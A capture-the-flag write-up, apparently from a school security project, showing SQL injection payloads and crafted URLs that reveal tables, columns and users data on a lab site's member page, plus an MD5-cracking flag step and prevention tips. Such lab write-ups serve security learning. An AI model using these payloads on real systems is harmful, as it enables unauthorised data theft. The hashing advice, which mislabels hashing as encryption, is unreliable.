# SQL Injection and Cryptographic Challenge Documentation

## Overview

This document provides a comprehensive guide on identifying and exploiting SQL injection vulnerabilities within a web application. Additionally, it outlines a cryptographic challenge involving MD5 hash decryption and SHA256 re-encryption, aimed at enhancing understanding of cryptographic principles and practices.

## Vulnerability Description

SQL injection vulnerabilities occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application. This document details various types of SQL injection attacks, including table name disclosure, boolean-based SQL injection, column name disclosure, and data extraction, highlighting the potential for unauthorized access to or manipulation of database information.

## Exploitation

### Table Name Disclosure

- **Injection Point**: The `id` parameter on the `member` page.
- **Payload**: `1 UNION SELECT null, table_name FROM information_schema.tables`
- **URL Example**: http://<ip_address>/index.php?page=member&id=1+UNION+SELECT+null%2C+table_name+FROM+information_schema.tables&Submit=Submit

### Boolean-Based SQL Injection

- **Payloads**:
- `1 OR 1=1`: Forces the application to return true for all conditions.
- `1 OR EXISTS (SELECT * FROM users)`: Checks if the `users` table contains any rows.
- **URL Example**: http://<ip_address>/index.php?page=member&id=1+OR+EXISTS+%28SELECT+\*+FROM+users+%29%3B+--+&Submit=Submit#

### Column Name Disclosure

- **Payload**: `1 UNION SELECT table_name, column_name FROM information_schema.columns`
- **URL Example**: http://<ip_address>/index.php?page=member&id=1+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#

### Data Extraction

- **Payload**: `1 OR 1=1 UNION SELECT title, comment from users`
- **Context**: This payload is used to extract `title` and `comment` from the `users` table.

## Cryptographic Challenge

- **Challenge**: Decrypt an MD5 hash and then re-encrypt the plaintext using SHA256.
- **MD5 Hash**: `1928e8083cf461a51303633093573c46`
- **Decrypted Text**: "albatroz"
- **Instructions**: Decrypt the given MD5 hash to plaintext, convert the plaintext to lowercase, and then encrypt it using SHA256 to reveal a flag.

## Additional Information

- The "list_images" table contains the following columns: `id`, `url`, `title`, `comment`.
- The cryptographic challenge provides a unique opportunity to apply decryption and encryption techniques to retrieve a hidden flag.
  For context, I have the following markdown in a file called `/Users/ionmi/Development/42/darkly/images_sql_injection/Ressources/README.md`:

## Prevention

- **Parameterized Queries**: Use parameterized queries to prevent SQL injection, as they ensure that the input is treated as a data value rather than part of the SQL command.
- **Input Validation**: Implement strict input validation checks to reject suspicious or malformed data.
- **Use of Prepared Statements**: With prepared statements, the SQL query is defined separately from its parameters, minimizing the risk of injection.
- **Employ Stronger Hashing Algorithms**: Replace MD5 with more secure hashing algorithms like SHA-256 to enhance cryptographic security.
- **Regular Security Audits**: Conduct thorough security audits and penetration testing to identify and mitigate vulnerabilities.

## Additional Resources

- [OWASP SQL Injection Prevention Cheat Sheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [MD5 Hash Generator and Decrypt](https://md5decrypt.net/en/)
- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)

This documentation aims to raise awareness about the critical nature of SQL injection vulnerabilities and the importance of cryptographic security in modern web applications. By understanding and applying the outlined prevention techniques, developers and security professionals can significantly enhance the security posture of their applications.
